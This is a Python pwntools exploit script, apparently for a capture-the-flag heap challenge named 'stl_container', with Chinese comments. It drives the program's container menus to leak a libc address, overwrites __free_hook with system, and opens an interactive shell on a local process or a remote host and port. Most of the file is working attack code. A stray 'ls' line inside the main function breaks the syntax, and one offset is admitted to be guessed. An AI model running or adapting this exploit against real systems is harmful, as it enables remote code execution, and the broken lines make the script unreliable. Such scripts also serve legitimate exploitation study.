#coding:utf-8
from pwn import *
debug = 1
context.log_level = 'debug'

#序号从0、1，最多两个
def wpList(r, switch, index = 0, data = '\x00'):	#顺序排列
	r.recvuntil('>> ')
	r.send('1')

	r.recvuntil('>> ')
	r.send(str(switch).ljust(0x7, '\x00'))
	
	if(switch == 1):		#add	malloc(0x98)	
	
		r.recvuntil('input data:')
		r.send(data)
	elif switch == 2:		#delete
		r.recvuntil('index?\n')
		r.send(str(index))
	elif switch == 3:		#show	
		r.recvuntil('index?\n')
		r.send(str(index))
		
		r.recvuntil('data: ')
		return r.recvuntil('\n')[:-1]

def wpVector(r, switch, index = 0, data = '\x00'):	#malloc(0x98)
	r.recvuntil('>> ')
	r.send('2')

	r.recvuntil('>> ')
	r.send(str(switch))
	
	if(switch == 1):		#add

		r.recvuntil('input data:')
		r.send(data)
	elif switch == 2:		#delete
		r.recvuntil('index?\n')
		r.send(str(index))
	elif switch == 3:		#show
		r.recvuntil('index?\n')
		r.send(str(index))
		
		r.recvuntil('data: ')
		return r.recvuntil('\n')[:-1]


def wpQueue(r, switch, index = 0, data = '\x00'):	#malloc(0x98)
	r.recvuntil('>> ')
	r.send('3')

	r.recvuntil('>> ')
	r.send(str(switch))
	
	if(switch == 1):		#add
	
		r.recvuntil('input data:')
		r.send(data)
	
	#dequeue


def wpStack(r, switch, index = 0, data = '\x00'):	#malloc(0x98)
	r.recvuntil('>> ')
	r.send('4')

	r.recvuntil('>> ')
	r.send(str(switch))
	
	if(switch == 1):		#add
		r.recvuntil('input data:')
		r.send(data)
	
	#pop


def wpExit(r):
	r.recvuntil('>> ')
	r.send('5')


def exp(debug):
	if debug == 1:
		r = process('./stl_container')
		gdb.attach(r, 'b *$rebase(0x0000000000001AA3)')
		#b *$rebase(0x1a8a)
		lib = ELF('/lib/x86_64-linux-gnu/libc.so.6')
		
	else:
		lib = ELF('./libc-2.27.so')
		r = remote('134.175.239.26', 8848)

	
	wpVector(r, 1, 0, '/bin/sh')
	wpVector(r, 1, 0, '/bin/sh')

	wpQueue(r, 1, 0, '/bin/sh')
	wpQueue(r, 1, 0, '/bin/sh')
	wpStack(r, 1, 0, '/bin/sh')
	wpStack(r, 1, 0, '/bin/sh')
	wpList(r, 1, 0, '/bin/sh')
	wpList(r, 1, 0, '/bin/sh')

	wpStack(r, 2, 0, '/bin/sh')
	wpStack(r, 2, 0, '/bin/sh')
	wpQueue(r, 2, 0, '/bin/sh')
	wpQueue(r, 2, 0, '/bin/sh')
	wpList(r, 2, 0, '/bin/sh')
	wpList(r, 2, 0, '/bin/sh')
	wpVector(r, 2, 0, '/bin/sh')


	wpQueue(r, 1, 0, '/bin/sh\x00')
	wpQueue(r, 1, 0, '/bin/sh\x00')
ls
	wpVector(r, 2, 0, '/bin/sh')
	wpVector(r, 1, 0, 'aaaaaaaa')
	wpVector(r, 1, 0, 'aaaaaaaa')

	lib_base = u64((wpVector(r, 3, 0, 'aaaaaaaa')[8:]).ljust(8, '\x00')) - 0x7f077cb38ca0 + 0x7f077c3af000
	log.info('lib_base => %#x'%lib_base)


	wpVector(r, 2, 0, '/bin/sh\x00')
	wpVector(r, 2, 0, '/bin/sh\x00')
	
	offset = 3792896	#不知道为什么，gdb试验出来


	log.info('__free_hook offset => %#x   __free_hook => %#x system => %#x'%(lib.sym['__free_hook'], lib_base + lib.sym['__free_hook'] + offset, lib_base + lib.sym['system'] + offset))
	wpVector(r, 1, 0, p64(lib_base + lib.sym['__free_hook'] + offset))
	wpStack(r, 1, 0, p64(lib_base + lib.sym['system'] + offset))
	
	wpQueue(r, 2, 0, '/bin/sh\x00')
	r.interactive()
	






	
exp(debug)
